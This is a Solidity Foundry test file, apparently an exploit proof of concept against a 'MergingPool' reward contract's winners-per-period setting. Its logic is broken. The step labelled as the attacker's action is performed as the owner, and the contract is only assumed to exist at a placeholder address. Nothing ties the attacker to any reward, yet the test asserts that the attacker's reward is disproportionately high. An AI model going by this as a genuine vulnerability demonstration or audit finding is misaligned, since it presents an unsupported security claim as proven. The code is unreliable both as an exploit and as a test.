// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface MergingPool {
    function updateWinnersPerPeriod(uint256 newWinners) external;
    function getWinnersPerPeriod() external view returns (uint256);
    function distributeRewards() external;
    function getRewardBalance(address user) external view returns (uint256);
}

contract ExploitTest is Test {
    MergingPool mergingPool;
    address owner;
    address attacker;
    address[] participants;

    function setUp() public {
        // Deploy the MergingPool contract
        owner = address(0x1);
        attacker = address(0x2);
        participants = [address(0x3), address(0x4), address(0x5)];

        // Assume the MergingPool contract is already deployed at this address
        mergingPool = MergingPool(address(0x100));

        // Fund the attacker and participants with some initial balance
        vm.deal(attacker, 100 ether);
        for (uint256 i = 0; i < participants.length; i++) {
            vm.deal(participants[i], 10 ether);
        }

        // Set the initial number of winners per period
        vm.prank(owner);
        mergingPool.updateWinnersPerPeriod(1);
    }

    function test_exploit() public {
        // Step 1: Attacker increases the number of winners per period
        vm.prank(owner);
        mergingPool.updateWinnersPerPeriod(10);

        // Step 2: Distribute rewards with the increased number of winners
        vm.prank(owner);
        mergingPool.distributeRewards();

        // Step 3: Check the reward balance of the attacker and participants
        uint256 attackerReward = mergingPool.getRewardBalance(attacker);
        uint256 participantReward = mergingPool.getRewardBalance(participants[0]);

        // Assert the vulnerability: Attacker's reward is disproportionately high
        assertGt(attackerReward, participantReward * 10, "Attacker's reward should be disproportionately high");
    }
}